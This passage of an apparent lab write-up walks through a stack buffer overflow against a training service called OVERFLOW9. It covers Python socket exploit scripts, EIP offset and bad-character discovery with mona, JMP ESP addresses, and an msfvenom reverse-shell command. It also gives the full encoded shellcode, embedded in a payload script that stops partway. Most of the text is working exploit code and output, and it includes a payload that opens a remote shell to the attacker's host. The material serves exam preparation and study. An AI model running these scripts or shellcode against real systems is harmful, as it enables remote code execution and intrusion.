k9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co"           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details
```


14. In target machine. Immunity Debugger > Debug > Restart > Play.


15. In Kali. Execute the exploit.py.

![800](img/Pasted%20image%2020240821150355.png)


16. Immunity Debugger. EIP 35794234.

![800](img/Pasted%20image%2020240904194748.png)


17. In Kali. Get the offset value of the EIP.

```shell
┌──(root㉿kali)-[/transfer]
└─# msf-pattern_offset -l 2000 -q 35794234
[*] Exact match at offset 1514
```

EIP Offset is 1514.

	Task 10
		a. What is the EIP offset for OVERFLOW9?
			1514


18. In Kali. Edit the exploit.py. Add the offset 1514 and put a retn to be reflected, can use "BBBB"

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW9 "  # The command or identifier expected by the target service
offset = 1514            # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = "BBBB"              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co"           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details

```


19. In target machine. Immunity Debugger > Debug > Restart > Play.


20. In Kali. Execute exploit.py.

![800](img/Pasted%20image%2020240821152534.png)


21. Immunity Debugger. Note the value ESP 01A9FA30.

![800](img/Pasted%20image%2020240904195135.png)


22. In Immunity Debugger. Create a BADCHARS using mona. By default the syntax \\x00 is a BADCHAR.

`!mona bytearray -b "\x00"

![800](img/Pasted%20image%2020240903181726.png)


23. Creating bad chars. In Kali. By using a python script. Generate a string of bad chars from \\x01 to \\xff.

```python
#!/usr/bin/env python3

from __future__ import print_function

#tart with 00 and add any others you find
bad = "00".split()

#turns them into a nice string to copy into python
print("badchars = ")
for x in range(1, 256):
	if "{:02x}".format(x) not in bad: 
		print("\\x" + "{:02x}".format(x), end='')

#creates a nice string to use in Mona
print("\n\nfor mona")
for byte in bad:
	print("\\x{}".format(byte), end='')
print()
```

```shell
┌──(root㉿kali)-[/transfer]
└─# python3 create.py 
badchars = 
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff

for mona
\x00

```


24. Using the generated bad chars, copy and edit the exploit.py.

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW9 "  # The command or identifier expected by the target service
offset = 1514             # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = "BBBB"              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details
```


25. In target machine. Immunity Debugger > Debug > Restart > Play.


26. Execute exploit.py

```shell
┌──(root㉿kali)-[/transfer]
└─# python3 exploit.py
Sending evil buffer...
Done!
```


27. In Immunity Debugger.  ESP 018DFA30

![800](img/Pasted%20image%2020240904195938.png)


28. In Immunity Debugger. Run the mona command to compare the bin and ESP value.

`!mona compare -f C:\mona\oscp\bytearray.bin -a 018DFA30

![800](img/Pasted%20image%2020240904200028.png)

mona Memory comparison results, item 0
 Address=0x018dfa30
 Status=Corruption after 3 bytes
 BadChars=00 04 05 3e 3f e1 e2
 Type=normal
 Location=Stack


29. Based on the output 00 04 05 3e 3f e1 e2. Only use 00 04 3e 3f e1 to be excluded in creating the bad chars. Edit the create.py.


```python
#!/usr/bin/env python3

from __future__ import print_function

#tart with 00 and add any others you find
bad = "00 04 3e 3f e1".split()

#turns them into a nice string to copy into python
print("badchars = ")
for x in range(1, 256):
	if "{:02x}".format(x) not in bad: 
		print("\\x" + "{:02x}".format(x), end='')

#creates a nice string to use in Mona
print("\n\nfor mona")
for byte in bad:
	print("\\x{}".format(byte), end='')
print()
```


```shell
┌──(root㉿kali)-[/transfer]
└─# python3 create.py 
badchars = 
\x01\x02\x03\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff

for mona
\x00\x04\x3e\x3f\xe1

```

	Task 10
		b. In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW9?
			\x00\x04\x3e\x3f\xe1


30. In target machine. Immunity Debugger. Tell mona to update the bytearray.

`!mona bytearray -b "\x00\x04\x3e\x3f\xe1"

![800](img/Pasted%20image%2020240904200932.png)


31. In target machine. Immunity Debugger > Debug > Restart > Play.


32. Edit the exploit.py with the bad chars. Then execute the exploit.py.

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW9 "  # The command or identifier expected by the target service
offset = 1514             # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = "BBBB"              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = "\x01\x02\x03\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details
```

![](img/Pasted%20image%2020240829171740.png)


31. Immunity Debugger. Compare using mona.

** Do not restart Immunity Debbuger.

`!mona compare -f C:\mona\oscp\bytearray.bin -a esp

![800](img/Pasted%20image%2020240904201050.png)


32. Immunity Debugger > Debug > Restart


33. Use the command mona jmp, the esp and the excluded bad chars.

`!mona jmp -r esp -cpb "\x00\x04\x3e\x3f\xe1"

Go to View > Log 
From the Log Data, select the JMP ESP and double click to open.

![800](img/Pasted%20image%2020240904201136.png)


![800](img/Pasted%20image%2020240904201157.png)

![800](img/Pasted%20image%2020240904201218.png)

Possible JMP ESP:

625011AF
625011BB
625011C7
625011D3
625011DF
625011EB
625011F7

`\xAF\x11\x50\x62
`\xBB\x11\x50\x62
`\xC7\x11\x50\x62
`\xD3\x11\x50\x62
`\xDF\x11\x50\x62`
`\xEB\x11\x50\x62
`\xF7\x11\x50\x62`


34. Create shellcode using msfvenom

`msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=9009 EXITFUNC=thread -b "\x00\x04\x3e\x3f\xe1" -f python -v "shellcode"


```shell
┌──(root㉿kali)-[/transfer]
└─# msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=9009 EXITFUNC=thread -b "\x00\x04\x3e\x3f\xe1" -f python -v "shellcode"
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1965 bytes
shellcode =  b""
shellcode += b"\xba\xe2\xc5\xd3\x34\xdb\xd0\xd9\x74\x24\xf4"
shellcode += b"\x5f\x31\xc9\xb1\x52\x31\x57\x12\x03\x57\x12"
shellcode += b"\x83\x0d\x39\x31\xc1\x2d\x2a\x34\x2a\xcd\xab"
shellcode += b"\x59\xa2\x28\x9a\x59\xd0\x39\x8d\x69\x92\x6f"
shellcode += b"\x22\x01\xf6\x9b\xb1\x67\xdf\xac\x72\xcd\x39"
shellcode += b"\x83\x83\x7e\x79\x82\x07\x7d\xae\x64\x39\x4e"
shellcode += b"\xa3\x65\x7e\xb3\x4e\x37\xd7\xbf\xfd\xa7\x5c"
shellcode += b"\xf5\x3d\x4c\x2e\x1b\x46\xb1\xe7\x1a\x67\x64"
shellcode += b"\x73\x45\xa7\x87\x50\xfd\xee\x9f\xb5\x38\xb8"
shellcode += b"\x14\x0d\xb6\x3b\xfc\x5f\x37\x97\xc1\x6f\xca"
shellcode += b"\xe9\x06\x57\x35\x9c\x7e\xab\xc8\xa7\x45\xd1"
shellcode += b"\x16\x2d\x5d\x71\xdc\x95\xb9\x83\x31\x43\x4a"
shellcode += b"\x8f\xfe\x07\x14\x8c\x01\xcb\x2f\xa8\x8a\xea"
shellcode += b"\xff\x38\xc8\xc8\xdb\x61\x8a\x71\x7a\xcc\x7d"
shellcode += b"\x8d\x9c\xaf\x22\x2b\xd7\x42\x36\x46\xba\x0a"
shellcode += b"\xfb\x6b\x44\xcb\x93\xfc\x37\xf9\x3c\x57\xdf"
shellcode += b"\xb1\xb5\x71\x18\xb5\xef\xc6\xb6\x48\x10\x37"
shellcode += b"\x9f\x8e\x44\x67\xb7\x27\xe5\xec\x47\xc7\x30"
shellcode += b"\xa2\x17\x67\xeb\x03\xc7\xc7\x5b\xec\x0d\xc8"
shellcode += b"\x84\x0c\x2e\x02\xad\xa7\xd5\xc5\xd8\x3c\x94"
shellcode += b"\xea\xb5\x40\x16\x36\x77\xcc\xf0\x52\x67\x98"
shellcode += b"\xab\xca\x1e\x81\x27\x6a\xde\x1f\x42\xac\x54"
shellcode += b"\xac\xb3\x63\x9d\xd9\xa7\x14\x6d\x94\x95\xb3"
shellcode += b"\x72\x02\xb1\x58\xe0\xc9\x41\x16\x19\x46\x16"
shellcode += b"\x7f\xef\x9f\xf2\x6d\x56\x36\xe0\x6f\x0e\x71"
shellcode += b"\xa0\xab\xf3\x7c\x29\x39\x4f\x5b\x39\x87\x50"
shellcode += b"\xe7\x6d\x57\x07\xb1\xdb\x11\xf1\x73\xb5\xcb"
shellcode += b"\xae\xdd\x51\x8d\x9c\xdd\x27\x92\xc8\xab\xc7"
shellcode += b"\x23\xa5\xed\xf8\x8c\x21\xfa\x81\xf0\xd1\x05"
shellcode += b"\x58\xb1\xf2\xe7\x48\xcc\x9a\xb1\x19\x6d\xc7"
shellcode += b"\x41\xf4\xb2\xfe\xc1\xfc\x4a\x05\xd9\x75\x4e"
shellcode += b"\x41\x5d\x66\x22\xda\x08\x88\x91\xdb\x18"

```


35. Create python script for payload.py

```python
#!/usr/bin/env python3

import socket  # Import the socket library for network communication

# Target IP address and port where the vulnerable service is running
ip = 'target.local'
port = 1337

# Shellcode: This is the payload that will be executed on the target machine
# The shellcode is written in hexadecimal format representing machine instructions

shellcode =  ""
shellcode += "\xba\xe2\xc5\xd3\x34\xdb\xd0\xd9\x74\x24\xf4"
shellcode += "\x5f\x31\xc9\xb1\x52\x31\x57\x12\x03\x57\x12"
shellcode += "\x83\x0d\x39\x31\xc1\x2d\x2a\x34\x2a\xcd\xab"
shellcode += "\x59\xa2\x28\x9a\x59\xd0\x39\x8d\x69\x92\x6f"
shellcode += "\x22\x01\xf6\x9b\xb1\x67\xdf\xac\x72\xcd\x39"
shellcode += "\x83\x83\x7e\x79\x82\x07\x7d\xae\x64\x39\x4e"
shellcode += "\xa3\x65\x7e\xb3\x4e\x37\xd7\xbf\xfd\xa7\x5c"
shellcode += "\xf5\x3d\x4c\x2e\x1b\x46\xb1\xe7\x1a\x67\x64"
shellcode += "\x73\x45\xa7\x87\x50\xfd\xee\x9f\xb5\x38\xb8"
shellcode += "\x14\x0d\xb6\x3b\xfc\x5f\x37\x97\xc1\x6f\xca"
shellcode += "\xe9\x06\x57\x35\x9c\x7e\xab\xc8\xa7\x45\xd1"
shellcode += "\x16\x2d\x5d\x71\xdc\x95\xb9\x83\x31\x43\x4a"
shellcode += "\x8f\xfe\x07\x14\x8c\x01\xcb\x2f\xa8\x8a\xea"
shellcode += "\xff\x38\xc8\xc8\xdb\x61\x8a\x71\x7a\xcc\x7d"
shellcode += "\x8d\x9c\xaf\x22\x2b\xd7\x42\x36\x46\xba\x0a"
shellcode += "\xfb\x6b\x44\xcb\x93\xfc\x37\xf9\x3c\x57\xdf"
shellcode += "\xb1\xb5\x71\x18\xb5\xef\xc6\xb6\x48\x10\x37"
shellcode += "\x9f\x8e\x44\x67\xb7\x27\xe5\xec\x47\xc7\x30"
shellcode += "\xa2\x17\x67\xeb\x03\xc7\xc7\x5b\xec\x0d\xc8"
shellcode += "\x84\x0c\x2e\x02\xad\xa7\xd5\xc5\xd8\x3c\x94"
shellcode += "\xea\xb5\x40\x16\x36\x77\xcc\xf0\x52\x67\x98"
shellcode += "\xab\xca\x1e\x81\x27\x6a\xde\x1f\x42\xac\x54"
shellcode += "\xac\xb3\x63\x9d\xd9\xa7\x14\x6d\x94\x95\xb3"
shellcode += "\x72\x02\xb1\x58\xe0\xc9\x41\x16\x19\x46\x16"
shellcode += "\x7f\xef\x9f\xf2\x6d\x56\x36\xe0\x6f\x0e\x71"
shellcode += "\xa0\xab\xf3\x7c\x29\x39\x4f\x5b\x39\x87\x50"
shellcode += "\xe7\x6d\x57\x07\xb1\xdb\x11\xf1\x73\xb5\xcb"
shellcode += "\xae\xdd\x51\x8d\x9c\xdd\x27\x92\xc8\xab\xc7"
shellcode += "\x23\xa5\xed\xf8\x8c\x21\xfa\x81\xf0\xd1\x05"
shellcode += "\x58\xb1\xf2\xe7\x48\xcc\x9a\xb1\x19\x6d\xc7"
shellcode += "\x41\xf4\xb2\xfe\xc1\xfc\x4a\x05\xd9\x75\x4e"
shellcode += "\x41\x5d\x66\x22\xda\x08\x88\x91\xdb\x18"

# Command to be sent to the target service. "OVERFLOW4 " is the vulnerable function or command.
Command = "OVERFLOW9 "

# Offset: Buffer of 'A's used to overflow the buffer until the return pointer
Offset = 1514 * "A"  # Fills the stack up to the return address (control the EIP)

